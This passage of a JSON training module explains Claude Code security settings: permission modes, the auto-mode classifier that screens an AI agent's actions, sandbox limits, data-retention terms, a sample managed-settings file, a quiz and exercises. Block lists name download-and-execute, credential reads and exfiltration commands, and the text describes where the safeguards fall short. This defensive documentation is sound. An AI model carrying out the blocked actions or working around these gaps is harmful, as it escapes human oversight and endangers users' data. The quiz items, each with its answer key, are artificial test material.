|\n| `auto` | Routed to the classifier (not auto-approved) |\n| `dontAsk` | Denied |\n| `bypassPermissions` | Allowed — this is why bypass is container-only |\n\n### Special behavior for `.claude/` writes\n\nThe `.claude/` directory is protected to prevent Claude from silently modifying its own permission rules or MCP configuration. When Claude needs to edit `.claude/` during a session, it prompts with a special option: **\"Yes, and allow Claude to edit its own settings for this session\"** — which then approves subsequent `.claude/` writes for the rest of that session without re-prompting.\n\nThe sandbox automatically denies write access to Claude Code's `settings.json` files at every scope and to the managed settings directory, so a sandboxed command cannot modify its own policy."
   },
   {
    "heading": "Auto Mode Classifier: The Per-Action Safety Gate",
    "body": "Auto mode (`--permission-mode auto`) replaces routine permission prompts with a server-side classifier that reviews actions before they run. Understanding its architecture is essential for knowing when to trust it and when not to.\n\n### Requirements\n\n- Claude Code v2.1.83 or later\n- **Model**: Claude Opus 4.6 or later, or Sonnet 4.6 on the Anthropic API. On Amazon Bedrock, Google Cloud Vertex AI, and Microsoft Foundry: only Claude Opus 4.7 and Opus 4.8 (older models including Sonnet 4.5, Opus 4.5, Haiku, and claude-3 models are not supported on any provider)\n- **Provider (Bedrock/Vertex/Foundry)**: set `CLAUDE_CODE_ENABLE_AUTO_MODE=1` — auto mode does not appear until this variable is set\n- **Team/Enterprise plans**: an admin must enable it in Claude Code admin settings before users can turn it on\n- `defaultMode: \"auto\"` must be in `~/.claude/settings.json` or managed settings — it is ignored in `.claude/settings.json` or `.claude/settings.local.json`\n\n### Decision order within auto mode\n\nEach action goes through a fixed order:\n\n1. Actions matching explicit **deny or ask rules** → resolved immediately (deny blocks, ask prompts)\n2. **Read-only actions** and file edits in the working directory → auto-approved (except protected paths)\n3. Writes to **protected paths** → routed to the classifier even if an allow rule matches\n4. Everything else → **classifier evaluates**\n5. If the classifier blocks → Claude receives the reason and tries an alternative\n\nOn entering auto mode, broad allow rules that grant arbitrary code execution are dropped: `Bash(*)`, `PowerShell(*)`, wildcarded interpreters like `Bash(python*)`, package-manager run commands, and `Agent` allow rules. Narrow rules like `Bash(npm test)` carry over. Dropped rules are restored when you leave auto mode.\n\n### What the classifier blocks by default\n\n```\nBlocked by default:\n  curl | bash  (download-and-execute patterns)\n  Sending sensitive data to external endpoints\n  Production deploys and migrations\n  Mass deletion on cloud storage\n  Granting IAM or repo permissions\n  Force push, or pushing directly to main\n  git reset --hard, git checkout -- ., git restore ., git clean -fd,\n  git stash drop, git stash clear\n  git commit --amend when the HEAD commit was not created in this session\n  terraform/pulumi/cdk/terragrunt destroy\n\nAllowed by default:\n  Local file operations in working directory\n  Installing dependencies from lock files / manifests\n  Reading .env and sending credentials to their matching API\n  Read-only HTTP requests\n  Pushing to the branch you started on or one Claude created\n```\n\nRun `claude auto-mode defaults` to see the full current rule lists. Run `claude auto-mode config` to see the effective config with your settings applied.\n\n### Configuring the classifier\n\nThe classifier reads `autoMode` configuration from user settings (`~/.claude/settings.json`), local project settings (`.claude/settings.local.json`), and managed settings. It does **not** read `autoMode` from shared project settings (`.claude/settings.json`), so a checked-in repo cannot inject its own classifier rules.\n\n```json\n{\n  \"autoMode\": {\n    \"environment\": [\n      \"$defaults\",\n      \"Source control: github.example.com/acme-corp and all repos under it\",\n      \"Trusted cloud buckets: s3://acme-build-artifacts\",\n      \"Trusted internal domains: *.corp.example.com\"\n    ],\n    \"allow\": [\n      \"$defaults\",\n      \"Deploying to the staging namespace is allowed: staging resets nightly\"\n    ],\n    \"soft_deny\": [\n      \"$defaults\",\n      \"Never run database migrations outside the migrations CLI\"\n    ],\n    \"hard_deny\": [\n      \"$defaults\",\n      \"Never send repository contents to third-party code-review APIs\"\n    ]\n  }\n}\n```\n\nThe literal string `\"$defaults\"` inherits Anthropic's built-in rules at that position. Omitting `\"$defaults\"` from any array **replaces** the entire built-in list for that section — including built-in security rules like force-push and exfiltration blocks.\n\nPrecedence within the classifier: `hard_deny` blocks unconditionally → `soft_deny` blocks (but can be overridden by `allow` rules or explicit user intent in the conversation) → `allow` adds exceptions to soft blocks.\n\n### Auto mode is a second gate, not an isolation boundary\n\n- The classifier sees user messages, tool calls, and `CLAUDE.md` content. **Tool results are stripped** — hostile content in a file or web page cannot directly manipulate the classifier.\n- It is explicitly labeled a **research preview** — it reduces prompts but does not guarantee safety.\n- Boundaries you state in conversation (\"don't push\", \"wait for my review\") act as classifier block signals for matching actions. These are not stored as rules — they are read from the transcript on each check and can be lost if context compaction removes the originating message. For a hard guarantee, add a `deny` rule instead.\n\n### Fallback behavior\n\nIf the classifier blocks an action **3 consecutive times** or **20 times total** in a session, auto mode pauses and normal prompting resumes. Approving one action resumes auto mode. These thresholds are not configurable. In non-interactive (`-p`) mode, repeated blocks abort the session."
   },
   {
    "heading": "Bash Sandbox Isolation: The Only Real OS-Level Boundary",
    "body": "Permission rules are evaluated by Claude Code's runtime. The Bash sandbox is enforced by the operating system. This is the critical difference: a sophisticated prompt injection that bypasses Claude's decision-making cannot escape the sandbox because the OS kernel enforces the boundary on the running process and all its children.\n\n### OS mechanisms\n\n| Platform | Mechanism | Notes |\n|----------|-----------|-------|\n| macOS | **Seatbelt** (mandatory access control) | Built-in, nothing to install |\n| Linux / WSL2 | **bubblewrap** (`bwrap`) + `socat` | Must install: `sudo apt-get install bubblewrap socat` (Ubuntu/Debian) or `sudo dnf install bubblewrap socat` (Fedora) |\n| WSL1 | Not supported | Upgrade to WSL2 |\n| Windows native | Not supported | Use WSL2 or a container |\n\nOn Linux, the optional seccomp filter adds Unix domain socket blocking. Install with `npm install -g @anthropic-ai/sandbox-runtime` if the Dependencies tab in `/sandbox` shows it missing.\n\n### What the sandbox covers\n\n```\nCovered (all Bash commands and their child processes):\n  ✓ Filesystem write access (restricted to working dir + session $TMPDIR by default)\n  ✓ Network access (proxy-enforced domain allowlist)\n  ✓ kubectl, terraform, npm, and any subprocess called from Bash\n\nDefault read access:\n  ✓ Read access to the entire computer by default\n  ✗ Note: this INCLUDES credential files like ~/.aws/credentials and ~/.ssh/ by default\n    Add them to sandbox.filesystem.denyRead explicitly\n\nNOT covered:\n  ✗ Claude's built-in file tools (Read, Edit, Write) — governed by permission rules only\n  ✗ MCP servers — run as separate processes outside the sandbox\n  ✗ Hooks — run outside the sandbox\n  ✗ Computer use — runs on actual desktop\n  ✗ Environment variables — sandboxed Bash inherits parent env including credentials\n         (set CLAUDE_CODE_SUBPROCESS_ENV_SCRUB to strip Anthropic and cloud provider credentials)\n```\n\n### Enable and configure\n\n```bash\n# Enable for current project (interactive panel)\n/sandbox\n# Opens Mode tab (auto-allow vs regular permissions) and Overrides tab\n```\n\nSettings configuration:\n\n```json\n// .claude/settings.json or ~/.claude/settings.json or managed-settings.json\n{\n  \"sandbox\": {\n    \"enabled\": true,\n    \"failIfUnavailable\": true,          // hard failure if sandbox can't start\n    \"allowUnsandboxedCommands\": false,  // disable escape-hatch fallback\n    \"filesystem\": {\n      \"allowWrite\": [\"~/.kube\", \"/tmp/build\"],  // extend write access\n      \"denyRead\":   [\"~/\"],                       // block reading home dir\n      \"allowRead\":  [\".\"]                         // re-allow project root within denied region\n    },\n    \"network\": {\n      \"allowedDomains\": [\"registry.npmjs.org\", \"github.com\"]\n    }\n  }\n}\n```\n\n**Path prefix semantics for sandbox config** differ from permission rules:\n\n| Prefix | Meaning |\n|--------|--------|\n| `/` | Absolute path from filesystem root (`/tmp/build` stays `/tmp/build`) |\n| `~/` | Home directory |\n| `./` or no prefix | Relative to project root (in project settings) or `~/.claude` (in user settings) |\n\nThis differs from Read/Edit permission rules where `/path` is project-relative and `//path` is absolute.\n\n### Two sandbox modes\n\n**Auto-allow mode** (default when sandboxing is enabled via `/sandbox`): Sandboxed Bash commands run without prompting. The bare `Bash` ask rule is skipped for commands that run sandboxed. Explicit deny rules, content-scoped ask rules (`Bash(git push *)`), and `rm`/`rmdir` targeting `/` or home still apply.\n\n**Regular permissions mode**: All Bash commands go through the regular permission flow even when sandboxed. More control, more approvals.\n\n### Sandbox vs. other isolation approaches\n\n| Approach | What it isolates | Enforced by | Overhead |\n|----------|-----------------|-------------|----------|\n| Permission rules | Which tools Claude attempts | Claude Code runtime | Negligible |\n| Auto mode classifier | Which actions proceed | Server-side ML model | Round-trip latency per action |\n| **Bash sandbox** | **What Bash processes can access** | **OS kernel** | **Minimal** |\n| Dev container | Entire Claude Code process | Container runtime | Startup time |\n| VM | Everything | Hypervisor | Highest |\n\n### Managed enforcement for organizations\n\n```json\n// managed-settings.json: require sandbox on all developer machines\n{\n  \"sandbox\": {\n    \"enabled\": true,\n    \"failIfUnavailable\": true,\n    \"allowUnsandboxedCommands\": false\n  }\n}\n```\n\nTo lock network domains to managed values only (developers cannot widen the domain list):\n\n```json\n{\n  \"sandbox\": {\n    \"network\": {\n      \"allowManagedDomainsOnly\": true,\n      \"allowedDomains\": [\"registry.npmjs.org\", \"github.com\"]\n    }\n  }\n}\n```\n\nWith `allowManagedDomainsOnly: true` (a managed-only setting), non-allowed domains are blocked automatically without prompting. Similarly, `sandbox.filesystem.allowManagedReadPathsOnly: true` locks read-path allowances to managed values only.\n\n### Security limitations\n\n- Network filtering is hostname-based (no TLS inspection). The proxy does not terminate TLS, so an allowed domain like `github.com` could potentially be used for domain fronting. For stronger guarantees, configure a custom proxy that terminates TLS.\n- Default read policy allows reading `~/.aws/credentials`, `~/.ssh/` — add them to `denyRead` explicitly.\n- `allowWrite` to directories containing executables in `$PATH` can enable privilege escalation.\n- `allowAppleEvents: true` on macOS removes code-execution isolation (needed for `open`, `osascript`). This setting is ignored in project settings; it only takes effect from user, managed, or CLI settings."
   },
   {
    "heading": "Commercial Account Terms: The Governance Layer You Cannot Configure Away",
    "body": "No settings file controls whether your company's code is used to train Anthropic's models. That is determined solely by which product tier your team uses.\n\n### Training data policy by plan\n\n| Plan tier | Used for model training? |\n|-----------|------------------------|\n| **Free** | Yes, by default (can opt out in privacy settings at claude.ai/settings/data-privacy-controls) |\n| **Pro / Max** | Yes, by default (can opt out in privacy settings) |\n| **Team** | No — Anthropic does not train on commercial customer data unless you explicitly opt in |\n| **Enterprise** | No — same as Team |\n| **API** | No — same as Team |\n\nThe Commercial Terms of Service state this directly: \"Anthropic may not train models on Customer Content from Services.\"\n\n### Data retention\n\n| Plan | Default retention | Notes |\n|------|-------------------|-------|\n| Free/Pro/Max with training allowed | 5 years | Training data retained in de-identified format |\n| Free/Pro/Max with training opted out | 30 days | Changed at claude.ai/settings/data-privacy-controls |\n| Team / Enterprise / API | 30 days | Standard commercial retention |\n| Enterprise with Zero Data Retention (ZDR) | Zero server-side persistence | Must be enabled per-org by account team; not included in standard Enterprise plan |\n\nLocal caching is separate from server retention: Claude Code stores session transcripts locally at `~/.claude/projects/` for 30 days by default to enable session resumption. Adjust with `cleanupPeriodDays` in settings.\n\n### What this means for team setup\n\nIf developers use personal Free, Pro, or Max accounts to work on company code:\n1. Their prompts (which include your codebase) may be used for training by default\n2. Retention can be 5 years if training is not opted out\n3. No commercial data processing agreements apply\n\nThe correct setup for any team working on non-public code:\n- Use **Team, Enterprise, or API** plan accounts for all developers\n- Provision accounts through your organization's admin console, not personal emails\n- For highest sensitivity (PII in code, regulated industries): request Zero Data Retention from your account team\n\n### Controlling feedback and telemetry\n\nEven on commercial plans, opt-in feedback mechanisms require attention:\n\n```bash\n# Disable the /feedback command from uploading transcripts\nexport DISABLE_FEEDBACK_COMMAND=1\n\n# Disable session quality surveys\nexport CLAUDE_CODE_DISABLE_FEEDBACK_SURVEY=1\n\n# Disable all non-essential traffic at once\n# (does not affect the WebFetch domain safety check)\nexport CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1\n\n# Disable telemetry (latency / reliability metrics)\nexport DISABLE_TELEMETRY=1\n\n# Disable Sentry error reporting\nexport DISABLE_ERROR_REPORTING=1\n\n# In managed-settings.json (applies to all developers):\n{ \"env\": { \"CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC\": \"1\" } }\n```\n\nThe session quality survey prompt records only your rating — no transcript. A separate optional follow-up asks if Anthropic may view the session transcript. Selecting \"Yes\" uploads the transcript; selecting \"No\" or \"Don't ask again\" sends nothing. Uploaded transcripts are retained for up to 6 months and cannot be used to train AI models.\n\nOrganizations with Zero Data Retention enabled never see the transcript-share follow-up."
   },
   {
    "heading": "Wiring It Together: A Reference managed-settings.json",
    "body": "The following annotated configuration is a realistic starting point for a team with moderately strict security requirements. Adjust based on your threat model.\n\n```json\n{\n  \"$schema\": \"https://json.schemastore.org/claude-code-settings.json\",\n\n  // Governance: only managed permission rules, hooks, and MCP servers apply\n  \"allowManagedPermissionRulesOnly\": true,\n  \"allowManagedHooksOnly\": true,\n  \"allowManagedMcpServersOnly\": true,\n\n  // Require Team/Enterprise login from your org\n  \"forceLoginOrgUUID\": \"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\",\n\n  // Pin to a tested minimum version\n  \"requiredMinimumVersion\": \"2.1.83\",\n\n  // Permission settings\n  \"permissions\": {\n    // Disable bypassPermissions — no developer can skip all safety checks\n    \"disableBypassPermissionsMode\": \"disable\",\n\n    // Default mode: acceptEdits for developer productivity\n    // Consider \"default\" for security-sensitive repos\n    \"defaultMode\": \"acceptEdits\",\n\n    \"allow\": [\n      \"Bash(npm run lint)\",\n      \"Bash(npm run test *)\",\n      \"Bash(npm run build)\",\n      \"Bash(git status)\",\n      \"Bash(git log *)\",\n      \"Bash(git diff *)\"\n    ],\n    \"deny\": [\n      // Block production operations\n      \"Bash(git push *)\",\n      \"Bash(* deploy *)\",\n      \"Bash(terraform apply *)\",\n      \"Bash(kubectl apply *)\",\n      // Block secret reading by Claude's built-in file tools\n      \"Read(.env)\",\n      \"Read(.env.*)\",\n      \"Read(./secrets/**)\",\n      \"Read(~/.aws/**)\",\n      \"Read(~/.ssh/**)\",\n      // Block exfiltration attempts\n      \"Bash(curl *)\",\n      \"WebSearch\"\n    ]\n  },\n\n  // MCP: only org-approved servers\n  \"allowedMcpServers\": [\n    { \"serverName\": \"github\" }\n  ],\n\n  // Sandbox: enforce OS-level Bash isolation\n  \"sandbox\": {\n    \"enabled\": true,\n    \"failIfUnavailable\": true,\n    \"allowUnsandboxedCommands\": false,\n    \"filesystem\": {\n      \"denyRead\": [\"~/.aws\", \"~/.ssh\"]\n    },\n    \"network\": {\n      \"allowManagedDomainsOnly\": true,\n      \"allowedDomains\": [\n        \"registry.npmjs.org\",\n        \"github.com\",\n        \"api.github.com\"\n      ]\n    }\n  },\n\n  // Suppress feedback survey (Team/Enterprise telemetry doesn't feed training)\n  \"env\": {\n    \"CLAUDE_CODE_DISABLE_FEEDBACK_SURVEY\": \"1\"\n  }\n}\n```\n\nDeploy this file to the managed settings path for your platform and distribute via MDM. Run `claude doctor` to validate configuration before fleet-wide rollout.\n\n### What goes in `.claude/settings.json` vs. managed\n\n| Setting | Committed project settings | Managed (IT-deployed) |\n|---------|---------------------------|----------------------|\n| Allow rules for project CI commands | Yes | No (project-specific) |\n| Deny rules for production operations | Optional | Preferred (enforced, cannot be overridden) |\n| `defaultMode` for the project | Yes | Can override via managed |\n| `disableBypassPermissionsMode` | Works from any scope | Preferred (so developers cannot counteract it) |\n| `forceLoginOrgUUID` | Managed only | Yes |\n| `allowManagedPermissionRulesOnly` | Managed only | Yes |\n| Sandbox config | Can be in project settings | Mandatory if required org-wide |\n| `autoMode.environment` | Not read from project settings | User or managed settings only |"
   },
   {
    "heading": "Common Pitfalls and Gotchas",
    "body": "### 1. Trusting CLAUDE.md to enforce security\n\n`CLAUDE.md` is behavioral guidance. It shapes what Claude tries to do, not what Claude Code permits. A `CLAUDE.md` that says \"never push to main\" provides no enforcement — add a `deny: [\"Bash(git push * main)\"]` rule.\n\n### 2. Writing `defaultMode: \"auto\"` in project settings\n\nClaude Code ignores `defaultMode: \"auto\"` in `.claude/settings.json` and `.claude/settings.local.json`. A repository cannot grant itself auto mode. Move this to `~/.claude/settings.json` or managed settings. If the session starts in `default` mode with no error after setting this, the setting is in the wrong file.\n\n### 3. Expecting allow rules to override deny rules\n\nThe evaluation order is fixed: deny → ask → allow. A narrow allow rule for a specific command cannot override a broader deny rule that matches it. There are no allow exceptions in deny rules.\n\n### 4. Using `Bash(curl http://github.com/ *)` for URL restriction\n\nBash URL-filtering rules are fragile. Options before the URL, different protocols, the URL in a variable, redirects, and extra whitespace all break the match. Use `deny: [\"Bash(curl *)\"]` plus `allow: [\"WebFetch(domain:github.com)\"]` instead. Remember that WebFetch restrictions alone don't block `curl` in Bash.\n\n### 5. Forgetting that the sandbox doesn't cover MCP servers or hooks\n\nThe sandbox restricts Bash processes. MCP servers run as separate processes and are not sandboxed. Hooks run outside the sandbox. If you need OS-level isolation of MCP server activity, run the MCP server itself in a container.\n\n### 6. Credential environment variables leaking into sandboxed Bash\n\nSandboxed Bash commands inherit the parent process environment by default, including `AWS_ACCESS_KEY_ID`, `GITHUB_TOKEN`, etc. Set `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` to strip Anthropic and cloud provider credentials from subprocesses. Also add credential directories to `sandbox.filesystem.denyRead`.\n\n### 7. Using personal Free/Pro/Max accounts for team work\n\nFree, Pro, and Max accounts default to training data use with up to 5-year retention when training is allowed. Even if a developer opts out, there is no commercial data processing agreement. Team or Enterprise plan accounts are required for company code.\n\n### 8. Forgetting that `allowManagedPermissionRulesOnly` blocks user allow rules too\n\nThis managed-only setting prevents users and projects from defining any allow, ask, or deny rules. Every tool not explicitly allowed in managed settings will fall through to the mode default. Maintain a comprehensive managed allow list if you enable this, or developers won't be able to approve routine commands.\n\n### 9. `bypassPermissions` blocked as root\n\nClaude Code refuses to start with `--permission-mode bypassPermissions` (or `--dangerously-skip-permissions`) when running as root or under `sudo` on Linux and macOS. The check is skipped inside a recognized sandbox. Use the dev container configuration, which runs Claude Code as a non-root user, for autonomous container runs.\n\n### 10. Compound commands and the \"safe prefix\" false sense of security\n\n`Bash(safe-tool *)` does NOT allow `safe-tool && rm -rf .`. Claude Code parses every subcommand independently. Each subcommand must independently match an allow rule and not match a deny rule.\n\n### 11. Omitting `\"$defaults\"` from autoMode arrays\n\nSetting `autoMode.soft_deny` without including `\"$defaults\"` **replaces** all built-in soft deny rules, discarding protections like the force-push and `curl | bash` blocks. The same applies to `hard_deny` and `allow`. Always include `\"$defaults\"` unless you intentionally want to take full ownership of the list.\n\n### 12. Wrong path syntax in sandbox config vs. permission rules\n\nSandbox filesystem paths use standard conventions (`/` is absolute, `~/` is home). Permission rule paths use a different convention (`//` is absolute, `/` is project-relative). Mixing them up silently produces wrong behavior with no error."
   }
  ],
  "preQuiz": [
   {
    "prompt": "Your company signs a BAA with Anthropic for HIPAA compliance. A dev on your team starts using Claude Code via the Anthropic API with the BAA in place, but hasn't done anything else. Are patient records safe to use as context?",
    "options": [
     "Yes — a signed BAA with Anthropic covers all Claude Code usage by default.",
     "No — a BAA alone is not sufficient; Zero Data Retention (ZDR) must also be activated per-org before the BAA coverage applies to Claude Code.",
     "No — Claude Code never supports HIPAA regardless of BAA or ZDR because prompts are logged client-side.",
     "Yes — API usage automatically activates ZDR, so a signed BAA is all that's needed."
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "BAA coverage requires BOTH a signed BAA AND ZDR activated per-org. A BAA alone does not extend HIPAA-eligible data protection to Claude Code; ZDR must be explicitly enabled."
   },
   {
    "prompt": "A developer on your team uses their personal Pro account (with training opted in) to get work done faster. What is the primary contractual risk?",
    "options": [
     "None — the training toggle only affects future models and doesn't expose current IP.",
     "Company source code and prompts sent via a personal Pro account with training enabled can be used to train Anthropic models, under consumer terms.",
     "The risk is only that free-tier rate limits will slow the team down; there are no data rights differences.",
     "Pro accounts are covered by the same commercial terms as Team accounts, so no extra risk exists."
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "Consumer plans (Free/Pro/Max) have different data terms than commercial plans. With training opted in, data retention is 5 years and code/prompts may be used for model training. Commercial plans (Team/Enterprise/API) never use your data for training unless you explicitly opt into the Development Partner Program."
   },
   {
    "prompt": "Your org's managed settings file includes `\"permissions\": {\"deny\": [\"Bash(rm -rf *)\"]}`. A developer adds `\"permissions\": {\"allow\": [\"Bash(rm -rf *)\"]}` to their local `.claude/settings.json`. What happens?",
    "options": [
     "The allow rule wins because local settings override managed settings for specific commands.",
     "The deny rule wins because managed settings sit at the top of precedence and a deny at any level cannot be overridden by any other level.",
     "Claude prompts the user each time, because conflicting rules at different scopes always fall back to 'ask'.",
     "The most specific rule wins, so the scoped allow overrides the managed deny."
    ],
    "correct": 1,
    "sectionIndices": [
     2
    ],
    "explanation": "Managed settings rank highest in the precedence chain, and a deny at any level cannot be overridden by any other level. A local allow rule has no power to override a managed deny."
   },
   {
    "prompt": "You add `\"Bash(safe_script.sh)\"` to your project's `permissions.allow`. A developer then runs a task that executes `safe_script.sh && rm -rf ./build`. Will both commands auto-approve?",
    "options": [
     "Yes — once the compound command is approved interactively, Claude saves a rule for the whole compound.",
     "No — Claude is shell-operator aware; each subcommand must independently match an allow rule. `rm -rf ./build` has no matching allow rule and will prompt.",
     "No — compound commands always prompt regardless of allow rules.",
     "Yes — `safe_script.sh` matches, so the entire pipeline inherits that approval."
    ],
    "correct": 1,
    "sectionIndices": [
     4
    ],
    "explanation": "Claude's permission engine is shell-operator aware. In a compound command (`&&`, `||`, `;`, `|`), each subcommand must independently match an allow rule. An allow for `safe_script.sh` does not cover `rm -rf ./build`."
   },
   {
    "prompt": "You write the rule `Bash(ls *)` in your allow list, intending to permit `ls` with any flags. A developer runs `lsof -i`. Is that command auto-approved?",
    "options": [
     "Yes — `*` in Bash rules matches any string, so `lsof` matches `ls *`.",
     "No — a space before `*` enforces a word boundary, so `Bash(ls *)` matches `ls -la` but not `lsof`.",
     "No — `ls *` only permits `ls` with no arguments.",
     "Yes — `Bash(ls *)` is equivalent to a prefix match that covers any command starting with `ls`."
    ],
    "correct": 1,
    "sectionIndices": [
     4
    ],
    "explanation": "In Claude Code Bash rule wildcards, a space before `*` enforces a word boundary. `Bash(ls *)` matches `ls -la` but not `lsof`. To match both you would use `Bash(ls*)` (no space)."
   },
   {
    "prompt": "You want to block all network requests except to your internal API. You add `Bash(curl *)` to `permissions.deny` and `WebFetch(domain:internal.company.com)` to `permissions.allow`. A developer's Python script uses `requests.get('https://external.com')`. Is that blocked?",
    "options": [
     "Yes — denying curl and restricting WebFetch is sufficient to block all outbound HTTP.",
     "No — Read/Edit deny rules cover Bash file commands like `cat`, but subprocess network calls (Python's `requests`) go through the OS and are not covered by Bash or WebFetch rules. Only a sandbox/container enforces OS-level isolation.",
     "Yes — WebFetch deny rules apply to all HTTP traffic regardless of which tool makes the call.",
     "No — but adding `WebFetch(domain:*)` to the deny list would also catch Python subprocess calls."
    ],
    "correct": 1,
    "sectionIndices": [
     4
    ],
    "explanation": "Permission rules govern tool calls within Claude Code, not OS-level network access. Bash deny rules cover Bash file commands like `cat`, but arbitrary subprocesses (Python, Node) reading files or making network calls bypass them. A sandbox or container is required for OS-level enforcement."
   },
   {
    "prompt": "Your team sets `defaultMode: \"auto\"` in `.claude/settings.json` (the checked-in project settings file). Developers pull the repo and start Claude Code. Does auto mode activate?",
    "options": [
     "Yes — checked-in settings apply to everyone who clones the repo, so auto mode activates for all.",
     "No — repo-level `defaultMode: \"auto\"` is silently ignored. Auto mode must be set in user settings (`~/.claude/settings.json`) or managed settings.",
     "No — auto mode requires a CLI flag; it cannot be set in any settings file.",
     "Yes — but only if the user has Claude Code v2.1.142 or later installed."
    ],
    "correct": 1,
    "sectionIndices": [
     5
    ],
    "explanation": "Since v2.1.142, repo-level `defaultMode: \"auto\"` is silently ignored. Auto mode can only be activated via `~/.claude/settings.json` (user scope), managed settings, or the `--settings` inline flag — never from a checked-in project settings file."
   },
   {
    "prompt": "You write a CLAUDE.md auto-mode section: `soft_deny: [\"Force push to main\"]`. A developer explicitly says 'force push this feature branch to origin.' Does the classifier block it?",
    "options": [
     "Yes — soft_deny entries are unconditional; explicit user intent has no effect.",
     "No — soft_deny can be overridden by explicit, specific user intent. Only hard_deny entries are unconditional. For true enforcement, use `permissions.deny`.",
     "No — CLAUDE.md entries never affect the classifier; only managed settings do.",
     "Yes — force push is always a hard_deny regardless of scope."
    ],
    "correct": 1,
    "sectionIndices": [
     5
    ],
    "explanation": "The classifier's tier hierarchy is: hard_deny (unconditional) → soft_deny (overridable by explicit user intent) → allow → remaining soft blocks. A soft_deny can be overridden when a developer expresses specific, explicit intent. For non-overridable enforcement use `permissions.deny`."
   },
   {
    "prompt": "You configure managed settings with `\"allowManagedPermissionRulesOnly\": true`. A developer adds new allow rules to their local `.claude/settings.json`. What happens to those local rules?",
    "options": [
     "They apply normally — `allowManagedPermissionRulesOnly` only prevents deny rules from being added locally.",
     "They are ignored — this key locks the permission rule set to only what the managed settings define; local additions are disregarded.",
     "They prompt the user before applying, but are eventually accepted.",
     "They apply in user scope (`~/.claude/settings.json`) but not project scope."
    ],
    "correct": 1,
    "sectionIndices": [
     2
    ],
    "explanation": "`allowManagedPermissionRulesOnly: true` is a managed-only key that restricts permission rules exclusively to those defined in managed settings. Local or user-scope permission rules are ignored when this is set."
   },
   {
    "prompt": "In `bypassPermissions` mode, a developer's `permissions.allow` rule list contains `Write(./.env)`. Does that allow rule auto-approve writes to `.env`?",
    "options": [
     "Yes — allow rules are always enforced regardless of permission mode.",
     "No — in `bypassPermissions` mode, allow rules have no effect. Only deny/ask rules and read-only Bash run; additionally, `.env` is not in the protected path list so the write would auto-proceed anyway without needing an allow rule.",
     "No — `.env` is a protected file and protected-path writes are never auto-approved in any mode, including bypassPermissions.",
     "Yes — bypassPermissions skips all prompts and allow rules become the only active gate."
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "In `bypassPermissions` mode, allow rules have no effect — the mode skips all prompts and auto-approves everything (except explicit deny/ask rules and the `rm -rf /` circuit-breaker). `.env` is not on the protected-file list (protected files include `.gitconfig`, shell rc files, package config files, `.mcp.json`, etc.), so the write proceeds without the allow rule mattering either way."
   },
   {
    "prompt": "You want to deny all MCP tool calls from a server named `github`, but still allow `mcp__github__get_repo`. Which rule set achieves this?",
    "options": [
     "`deny: [\"mcp__github\"]` and `allow: [\"mcp__github__get_repo\"]` — the allow overrides the deny for that specific tool.",
     "This is impossible — a bare server deny (`mcp__github`) removes all its tools from context entirely; a scoped allow cannot reinstate individual tools.",
     "`deny: [\"mcp__github__*\"]` and `allow: [\"mcp__github__get_repo\"]` — the scoped deny leaves the server available and the allow reinstates the specific tool.",
     "`deny: [\"mcp__github\"]` only — the deny already excludes all tools except explicitly named ones."
    ],
    "correct": 1,
    "sectionIndices": [
     4
    ],
    "explanation": "A bare-tool deny (`mcp__github`, equivalent to `mcp__github__*`) removes the entire server from context. Once the server is removed, no scoped allow can reinstate individual tools. If you want to selectively allow certain tools, use scoped denies (`mcp__github__delete_*`) rather than a bare server deny."
   },
   {
    "prompt": "Your project's `.claude/settings.json` has `\"permissions\": {\"allow\": [\"WebFetch(domain:*.company.com)\"]}`. A developer tries to fetch `https://company.com/api`. Is it auto-approved?",
    "options": [
     "Yes — `*.company.com` is a wildcard that matches `company.com` and all subdomains.",
     "No — `*.company.com` matches subdomains (e.g. `api.company.com`) but NOT `company.com` itself. A separate rule for `company.com` is needed.",
     "No — WebFetch allow rules require the full URL path, not just the domain.",
     "Yes — domain wildcards in WebFetch always match the apex domain and all subdomains."
    ],
    "correct": 1,
    "sectionIndices": [
     4
    ],
    "explanation": "`WebFetch(domain:*.company.com)` matches subdomains but NOT the apex domain `company.com` itself. To allow both, you need two rules: `WebFetch(domain:*.company.com)` and `WebFetch(domain:company.com)`."
   }
  ],
  "tasks": [
   {
    "id": "stage-2-task-inspect-permissions",
    "afterSectionIdx": 2,
    "title": "Audit your active permission rules and settings scopes",
    "instructions": "1. Open a terminal and launch Claude Code in an existing project directory:\n```bash\nclaude\n```\n2. Inside the Claude Code session, run:\n```\n/permissions\n```\nNote which rules are active and which file they came from (managed, project, user, local).\n\n3. Run:\n```\n/status\n```\nConfirm whether a managed settings source is active (look for \"Managed settings\" in the output).\n\n4. Exit Claude Code (`/exit` or Ctrl+C) and inspect your user-level settings file:\n```bash\ncat ~/.claude/settings.json\n```\nIf it doesn't exist yet, that's expected — note the absence.\n\n5. Inspect the project-level shared settings (if present):\n```bash\ncat .claude/settings.json\n```\nAnd the local (gitignored) override:\n```bash\ncat .claude/settings.local.json\n```",
    "doneWhen": "You have run `/permissions` and `/status` inside a Claude Code session and can identify which settings file is the source of each active rule (or confirmed that no managed settings source is active)."
   },
   {
    "id": "stage-2-task-add-deny-rule",
    "afterSectionIdx": 4,
    "title": "Add a scoped Bash deny rule and verify it fires",
    "instructions": "1. Open (or create) your project's shared settings file:\n```bash\nmkdir -p .claude\nnano .claude/settings.json\n```\n2. Add the following deny rule that blocks `rm -rf` commands (preserve any existing content):\n```json\n{\n  \"permissions\": {\n    \"deny\": [\"Bash(rm -rf *)\"]\n  }\n}\n```\nSave the file.\n\n3. Launch Claude Code in the same directory:\n```bash\nclaude\n```\n\n4. Ask Claude to run:\n```\nPlease run: rm -rf /tmp/test-deleteme\n```\nVerify that Claude Code blocks the command rather than executing it (you should see a permission denial, not execution).\n\n5. Run `/permissions` to confirm the deny rule appears in the active rule list.\n\n6. Now test that a similar but non-matching command still works:\n```\nPlease run: rm /tmp/test-deleteme\n```\n(You can create that file first with `touch /tmp/test-deleteme` in a separate terminal.) This should prompt or succeed, confirming the deny is scoped to `rm -rf` specifically.",
    "doneWhen": "Claude Code blocks `rm -rf` with a permission denial message, and `/permissions` shows your deny rule as active from `.claude/settings.json`."
   },
   {
